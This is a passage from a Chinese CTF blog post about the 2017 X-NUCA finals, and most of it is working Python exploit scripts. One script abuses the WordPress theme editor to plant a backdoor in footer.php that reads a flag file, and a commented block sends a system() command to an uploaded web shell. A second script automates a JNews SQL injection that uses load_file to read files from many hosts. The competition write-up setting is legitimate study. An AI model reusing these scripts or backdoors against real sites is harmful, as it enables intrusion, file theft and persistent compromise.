LFI'</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">except</span> urllib2.URLError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'LFI error'</span> + e.reason</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginAsAdmin</span><span class="params">(root_url)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		url = root_url</span><br><span class="line">		req = urllib2.Request(url = url)</span><br><span class="line">		res = urllib2.urlopen(req)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'uniform tax rebate chef'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.read():</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'Theme Not Correct!'</span></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		url = root_url + <span class="string">'/?d=1'</span></span><br><span class="line">		cookie = cookielib.CookieJar()</span><br><span class="line">		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class="line">		req = urllib2.Request(url = url)</span><br><span class="line">		res = opener.open(req)</span><br><span class="line">		res = opener.open(req)</span><br><span class="line">		content = res.read()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'登出'</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">			<span class="comment"># print '[!] Cannot log in as admin!!!'</span></span><br><span class="line">			<span class="comment"># print content</span></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">return</span> opener</span><br><span class="line">	<span class="keyword">except</span> urllib2.URLError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'login error'</span> + e.reason</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadShell</span><span class="params">(root_url)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		opener = loginAsAdmin(root_url)</span><br><span class="line">		<span class="keyword">if</span> opener <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[!] Cannot log in as admin!!!'</span></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		installUrl = root_url + <span class="string">'/wp-admin/theme-editor.php?file=footer.php&amp;theme=AccountingTime'</span></span><br><span class="line">		getNonceReq = urllib2.Request(url = installUrl)</span><br><span class="line">		res = opener.open(getNonceReq)</span><br><span class="line">		content = res.read()</span><br><span class="line">		<span class="keyword">if</span> content == <span class="string">''</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'get Nonce Page Error!!!'</span></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		nonceList = re.findall(<span class="string">'&lt;input type="hidden" id="_wpnonce" name="_wpnonce" value="([a-zA-Z0-9]+)"'</span>,content)</span><br><span class="line">		<span class="keyword">if</span> nonceList == []:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'get Nonce Page Error!!!!'</span></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		nonce = nonceList[<span class="number">0</span>]</span><br><span class="line">		boundary = <span class="string">'----------%s'</span> % hex(int(time.time() * <span class="number">1000</span>))</span><br><span class="line">		data = []</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'_wpnonce'</span>)</span><br><span class="line">		data.append(nonce)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'_wp_http_referer'</span>)</span><br><span class="line">		data.append(<span class="string">'/wp-admin/plugin-install.php'</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'newcontent'</span>)</span><br><span class="line">		data.append(<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;?php global $theme; ?&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&lt;?php if($theme-&gt;display('footer_widgets')) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;div id="footer-widgets" class="clearfix"&gt;</span></span><br><span class="line"><span class="string">        &lt;?php</span></span><br><span class="line"><span class="string">        /**</span></span><br><span class="line"><span class="string">        * Footer  Widget Areas. Manage the widgets from: wp-admin -&gt; Appearance -&gt; Widgets </span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="footer-widget-box"&gt;</span></span><br><span class="line"><span class="string">            &lt;?php</span></span><br><span class="line"><span class="string">                if(!dynamic_sidebar('footer_1')) &#123;</span></span><br><span class="line"><span class="string">                    $theme-&gt;hook('footer_1');</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ?&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;div class="footer-widget-box"&gt;</span></span><br><span class="line"><span class="string">            &lt;?php</span></span><br><span class="line"><span class="string">                if(!dynamic_sidebar('footer_2')) &#123;</span></span><br><span class="line"><span class="string">                    $theme-&gt;hook('footer_2');</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ?&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;div class="footer-widget-box footer-widget-box-last"&gt;</span></span><br><span class="line"><span class="string">            &lt;?php</span></span><br><span class="line"><span class="string">                if(!dynamic_sidebar('footer_3')) &#123;</span></span><br><span class="line"><span class="string">                    $theme-&gt;hook('footer_3');</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ?&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;?php  &#125; ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div id="footer"&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        &lt;div id="copyrights"&gt;</span></span><br><span class="line"><span class="string">            &lt;?php</span></span><br><span class="line"><span class="string">                if($theme-&gt;display('footer_custom_text')) &#123;</span></span><br><span class="line"><span class="string">                    $theme-&gt;option('footer_custom_text');</span></span><br><span class="line"><span class="string">                &#125; else &#123; </span></span><br><span class="line"><span class="string">                    ?&gt; &amp;copy; &lt;?php echo date('Y'); ?&gt;  &lt;a href="&lt;?php echo home_url(); ?/g"&gt;&lt;?php bloginfo('name'); ?&gt;&lt;/a&gt;&lt;?php</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ?&gt; </span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;?php /* </span></span><br><span class="line"><span class="string">            All links in the footer should remain intact. </span></span><br><span class="line"><span class="string">            These links are all family friendly and will not hurt your site in any way. </span></span><br><span class="line"><span class="string">            Warning! Your site may stop working if these links are edited or deleted </span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            You can buy this theme without footer links online at https://flexithemes.com/buy/?theme=accountingtime</span></span><br><span class="line"><span class="string">        */ ?&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;div id="credits"&gt;Powered by &lt;a href="http://wordpress.org/"&gt;&lt;strong&gt;WordPress&lt;/strong&gt;&lt;/a&gt; | Theme Designed by: &lt;?php echo wp_theme_credits(0); ?&gt;  | Thanks to &lt;?php echo wp_theme_credits(1); ?&gt;, &lt;?php echo wp_theme_credits(2); ?&gt; and &lt;?php echo wp_theme_credits(3); ?&gt;&lt;/div&gt;&lt;!-- #credits --&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &lt;/div&gt;&lt;!-- #footer --&gt;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&lt;/div&gt;&lt;!-- #container --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php wp_footer(); ?&gt;</span></span><br><span class="line"><span class="string">&lt;?php $theme-&gt;hook('html_after'); ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php if md5($_GET['pr0ph3t'])=='379377cfde157b4d7f6529d448dadd23' echo file_get_contents('/opt/xnuca/flag.txt');?&gt;</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'action'</span>)</span><br><span class="line">		data.append(<span class="string">'update'</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'file'</span>)</span><br><span class="line">		data.append(<span class="string">'footer.php'</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'theme'</span>)</span><br><span class="line">		data.append(<span class="string">'AccountingTime'</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'scrollto'</span>)</span><br><span class="line">		data.append(<span class="string">'818.1818237304688'</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'docs-list'</span>)</span><br><span class="line">		data.append(<span class="string">''</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		data.append(<span class="string">'Content-Disposition: form-data; name="%s"\r\n'</span> % <span class="string">'submit'</span>)</span><br><span class="line">		data.append(<span class="string">'更新文件'</span>)</span><br><span class="line">		data.append(<span class="string">'--%s'</span> % boundary)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># file = open('fuck.php','rb')</span></span><br><span class="line">		<span class="comment"># data.append('Content-Disposition: form-data; name="%s"; filename="123.php\r\n' % 'pluginzip')</span></span><br><span class="line">		<span class="comment"># data.append('Content-Type: text/php\r\n')</span></span><br><span class="line">		<span class="comment"># data.append(file.read())</span></span><br><span class="line">		<span class="comment"># file.close()</span></span><br><span class="line">		<span class="comment"># data.append('--%s--\r\n' % boundary)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># data.append('Content-Disposition: form-data; name="%s"\r\n' % 'install-plugin-submit')</span></span><br><span class="line">		<span class="comment"># data.append('现在安装')</span></span><br><span class="line">		<span class="comment"># data.append('--%s' % boundary)</span></span><br><span class="line"></span><br><span class="line">		uploadUrl = root_url + <span class="string">'/wp-admin/theme-editor.php'</span></span><br><span class="line">		http_body=<span class="string">'\r\n'</span>.join(data)</span><br><span class="line"></span><br><span class="line">		req=urllib2.Request(uploadUrl, data=http_body)</span><br><span class="line">		req.add_header(<span class="string">'Content-Type'</span>, <span class="string">'multipart/form-data; boundary=%s'</span> % boundary)</span><br><span class="line">		req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0'</span>)</span><br><span class="line">		<span class="keyword">try</span> : </span><br><span class="line">			res = opener.open(req, timeout=<span class="number">10</span>)</span><br><span class="line">		<span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		content = res.read()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'文件修改成功'</span> <span class="keyword">in</span> content: <span class="comment">#后面为了方便就把上传和修改footer文件写在一起了。。。 注释掉的都是上传的</span></span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[!] '</span> + root_url + <span class="string">' getShell through footer.php'</span></span><br><span class="line">			req = urllib2.Request(root_url+<span class="string">'/?pr0ph3t=dalaohao'</span>)</span><br><span class="line">			res = urllib2.urlopen(req)</span><br><span class="line">			content = res.read()</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'gongfang'</span> <span class="keyword">in</span> content:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'[!!] '</span> + root_url + <span class="string">' get flag '</span> + re.findall(<span class="string">'gongfang_flag\&#123;(.*)\&#125;'</span>)[<span class="number">0</span>]</span><br><span class="line">		<span class="comment"># if '正在安装您上传的插件' in content:</span></span><br><span class="line">		<span class="comment"># 	print '[!] Upload Shell success! Path : /wp-content/uploads/2017/12/123.php'</span></span><br><span class="line">		<span class="comment"># 	req = urllib2.Request(root_url+'/wp-content/uploads/2017/12/123.php')</span></span><br><span class="line">		<span class="comment"># 	req1 = urllib2.Request(root_url+'/wp-content/uploads/2017/12/.db.inc.php')</span></span><br><span class="line">		<span class="comment"># 	try:</span></span><br><span class="line">		<span class="comment"># 		urllib2.urlopen(req1, timeout=0.2)</span></span><br><span class="line">		<span class="comment"># 	except socket.timeout as e:</span></span><br><span class="line">		<span class="comment"># 		pass</span></span><br><span class="line">		<span class="comment"># 	try:</span></span><br><span class="line">		<span class="comment"># 		urllib2.urlopen(req, timeout=0.2)</span></span><br><span class="line">		<span class="comment"># 	except socket.timeout as e:</span></span><br><span class="line">		<span class="comment"># 		pass</span></span><br><span class="line">		<span class="comment"># 	req = urllib2.Request(root_url+'/wp-content/uploads/2017/12/.index.php',data=json.dumps(&#123;"p":"密码","c":"system('cat+/opt/xnuca/flag.txt');"&#125;))</span></span><br><span class="line">		<span class="comment"># 	res = urllib2.urlopen(req)</span></span><br><span class="line">		<span class="comment"># 	print root_url + ' flag is : ' + res.read()</span></span><br><span class="line">		<span class="comment"># else:</span></span><br><span class="line">		<span class="comment"># 	print '[?] Upload Fail....'</span></span><br><span class="line">	<span class="keyword">except</span> urllib2.URLError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'upload error'</span> + e.reason</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">8</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	target = <span class="string">'http://192.121.'</span> + str(x) + <span class="string">'.31'</span></span><br><span class="line"><span class="comment"># target = 'http://192.108.1.30:8002'# + str(x)</span></span><br><span class="line">	easy_webshell(target) <span class="comment"># ok!</span></span><br><span class="line">	LFI(target) <span class="comment"># ???</span></span><br><span class="line">	uploadShell(target)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>web2的因为没有在第一天获取到源码分析，所以比较吃亏。。队友找了很久才找到一个注入，也同样是利用load_file读取flag，这也是后面我们打得这么凶的原因，注入点：<br>JNews注入：<a href="https://www.exploit-db.com/exploits/38565/" target="_blank" rel="noopener">exp</a><br>我们的利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">se = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(hostname=<span class="string">'192.108.1.14:1180'</span>,pos=<span class="number">32</span>,length=<span class="number">32</span>)</span>:</span></span><br><span class="line">	url = <span class="string">'http://'</span>+hostname+<span class="string">'/index.php?option=com_jnews&amp;view=subscribe&amp;act=subone&amp;Itemid=206'</span></span><br><span class="line">	res = se.get(url)</span><br><span class="line">	content = res.content</span><br><span class="line">	tokenGroup = re.findall(<span class="string">'name="Itemid" value="206" /&gt;&lt;input type="hidden" name="(.*)" value'</span>,content)</span><br><span class="line">	<span class="keyword">if</span> tokenGroup != []:</span><br><span class="line">		token = tokenGroup[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		token = <span class="string">''</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">#post data</span></span><br><span class="line">	data = &#123;&#125;</span><br><span class="line">	data[<span class="string">'Itemid'</span>] = <span class="string">'206'</span></span><br><span class="line">	data[<span class="string">'name'</span>] = <span class="string">'123123'</span></span><br><span class="line">	data[<span class="string">'email'</span>] = <span class="string">'123@123.com'</span></span><br><span class="line">	data[<span class="string">'receive_html'</span>] = <span class="string">'1'</span></span><br><span class="line">	data[<span class="string">'timezone'</span>] = <span class="string">'00%3A00%3A00'</span></span><br><span class="line">	data[<span class="string">'confirmed'</span>] = <span class="string">'1'</span></span><br><span class="line">	data[<span class="string">'subscribed[1]'</span>] = <span class="string">'1'</span></span><br><span class="line">	data[<span class="string">'sub_list_id[1]'</span>] = <span class="string">"1 AND EXTRACTVALUE(8483,CONCAT(0x5c,(SELECT(ELT(8483=8483,substr(load_file('/opt/xnuca/flag.txt'),"</span>+str(pos)+<span class="string">","</span>+str(length)+<span class="string">")))),0x716b786b71))"</span> <span class="comment">#point</span></span><br><span class="line">	data[<span class="string">'acc_level[1]'</span>] = <span class="string">'29'</span></span><br><span class="line">	data[<span class="string">'passwordA'</span>] = <span class="string">'FJTx2ubwvj2BA'</span></span><br><span class="line">	data[<span class="string">'fromFrontend'</span>] = <span class="string">'1'</span></span><br><span class="line">	data[<span class="string">'act'</span>] = <span class="string">'subscribe'</span></span><br><span class="line">	data[<span class="string">'subscriber_id'</span>] = <span class="string">'0'</span></span><br><span class="line">	data[<span class="string">'user_id'</span>] = <span class="string">'0'</span></span><br><span class="line">	data[<span class="string">'option'</span>] = <span class="string">'com_jnews'</span></span><br><span class="line">	data[<span class="string">'task'</span>] = <span class="string">'save'</span></span><br><span class="line">	data[<span class="string">'boxchecked'</span>] = <span class="string">'0'</span></span><br><span class="line">	data[token] = <span class="string">'1'</span></span><br><span class="line">	</span><br><span class="line">	vulUrl = <span class="string">'http://'</span>+ hostname +<span class="string">'/index.php/component/jnews/'</span></span><br><span class="line">	res = se.post(vulUrl,data=data)</span><br><span class="line">	flag = re.findall(<span class="string">r'XPATH syntax error: &amp;#039;\\(.*)&amp;#039; SQL='</span>,res.content)</span><br><span class="line">	<span class="keyword">if</span> flag != []:</span><br><span class="line">		<span class="keyword">return</span> flag[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">20</span>): <span class="comment">#跳过一些确认打不了的主机加快时间</span></span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">8</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">7</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">10</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">11</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">12</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"><span class="comment"># hostname = '192.108.1.14:1180'</span></span><br><span class="line">	hostname = <span class="string">'192.121.'</span> + str(x) + <span class="string">'.34'</span></span><br><span class="line">	win = <span class="string">''</span></span><br><span class="line">	win = getToken(hostname,<span class="number">1</span>)</span><br><span class="line">	win += getToken(hostname,<span class="number">32</span>)</span><br><span class="line">	win += getToken(hostname,<span class="number">63</span>,<span class="number">17</span>)[:<span class="number">-5</span>]</span><br><span class="line">	<span class="keyword">print</span> hostname + <span class="string">' get flag '</span> +win</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ul>
+<li>第二天全天<ul>
+<li>被虐</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>总结来说这次比赛还是有不足的，第一就是个人赛的有点瓜皮。。。主办方给的提示是题目都没有暴力操作。。。所以自己就很麻瓜的连扫目录都懒得扫了。。。导致错过<a href="http://www.zip文件。第二就是策略不太对，第一天应该侧重点在渗透和下源码，而不是一被打了就乱了节奏" target="_blank" rel="noopener">www.zip文件。第二就是策略不太对，第一天应该侧重点在渗透和下源码，而不是一被打了就乱了节奏</a> Orz 师傅们都太强了。。。</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/12/23/2017-X-NUCA-总决赛小结/">[2017 X-NUCA]总决赛小结</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Pr0ph3t 的个人博客">Pr0ph3t</a></p>
+        <p><span>发布时间:</span>2017年12月23日 - 23时27分</p>
+        <p><span>最后更新:</span>2019年07月06日 - 17时55分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/12/23/2017-X-NUCA-总决赛小结/" title="[2017 X-NUCA]总决赛小结">https://blog.pr0ph3t.com/2017/12/23/2017-X-NUCA-总决赛小结/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://blog.pr0ph3t.com/2017/12/23/2017-X-NUCA-总决赛小结/　　作者: Pr0ph3t" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2018/01/08/hitcon2017-Sql-so-hard-复现/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          [hitcon2017] Sql-so-hard 复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/11/27/hitcon2017-BabyFirst-Revenge-V2复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">[hitcon2017] BabyFirst Revenge V2复现</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#个人赛"><span class="toc-number">1.</span> <span class="toc-text">个人赛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#团队赛"><span class="toc-number">2.</span> <span class="toc-text">团队赛</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/01/08/hitcon2017-Sql-so-hard-复现/" title="上一篇: [hitcon2017] Sql-so-hard 复现">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/11/27/hitcon2017-BabyFirst-Revenge-V2复现/" title="下一篇: [hitcon2017] BabyFirst Revenge V2复现">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/06/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/01/题目-记一次利用gopher的内网mysql盲注/">[题目]记一次利用gopher的内网mysql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/03/hitctf-Web-Writeup/">[hitctf] Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/26/hitcon2017-Baby-H-master-php-2017-复现/">[hitcon2017] Baby^H-master-php-2017 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/hitcon2017-SSRF-Me复现/">[hitcon2017] SSRF Me复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/08/hitcon2017-Sql-so-hard-复现/">[hitcon2017] Sql-so-hard 复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/2017-X-NUCA-总决赛小结/">[2017 X-NUCA]总决赛小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/27/hitcon2017-BabyFirst-Revenge-V2复现/">[hitcon2017] BabyFirst Revenge V2复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/hitcon2017-BabyFirst-Revenge复现/">[hitcon2017] BabyFirst Revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/08/Web狗要懂的Padding-Oracle攻击/">Web狗要懂的Padding Oracle攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/24/Web狗要懂的CBC翻转字节攻击-Flipped-Ciphertext-Bits/">Web狗要懂的CBC翻转字节攻击(Flipped Ciphertext Bits)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/10/2017世安杯-决赛Writeup/">[2017世安杯] 决赛Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/09/2017世安杯-初赛Web-Writeup/">[2017世安杯] 初赛Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/2017强网杯-线下总结/">[2017强网杯] 线下总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/19/2017WHCTF-Web详细复现-伪-WP/">[2017WHCTF] Web详细复现(伪)WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/2017强网杯-Web-Writeup/">[2017强网杯] Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/XMAN-线下赛总结/">[XMAN] 线下赛总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/14/2017X-nuca-赛前热身Writeup/">[2017X-nuca] 赛前热身Writeup</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Pr0ph3t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
